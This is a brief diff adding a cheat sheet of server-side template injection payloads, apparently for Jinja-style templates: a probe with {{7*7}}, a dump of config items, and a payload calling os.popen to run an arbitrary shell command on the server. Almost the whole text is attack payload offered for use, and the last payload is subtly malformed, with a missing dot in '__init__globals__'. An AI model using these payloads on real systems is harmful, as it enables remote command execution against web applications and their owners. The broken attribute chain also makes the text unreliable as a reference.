@@ -1,0 +1,6 @@
+confirm SSTI
+  {{7*7}}
+see what's evaluated
+  {{config.items()}}
+inject commands
+  {{config.__class__.__init__globals__['os'].popen('<cli_command_e.g._whoami>')}}
